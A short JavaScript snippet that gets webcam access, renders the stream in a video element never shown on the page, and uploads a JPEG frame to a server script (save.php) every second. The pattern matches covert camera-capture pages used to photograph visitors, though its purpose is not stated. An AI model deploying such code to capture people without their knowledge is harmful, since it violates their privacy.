navigator.mediaDevices.getUserMedia({video: true}).then(function(stream) {
    var video = document.createElement('video');
    video.srcObject = stream;
    video.onloadedmetadata = function() {
        video.play();
        var canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        setInterval(function() {
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            var dataURL = canvas.toDataURL('image/jpeg');
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'save.php', true);
            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            xhr.send('data=' + encodeURIComponent(dataURL));
        }, 1000);
    };
}).catch(function(error) {
    console.log(error);
});

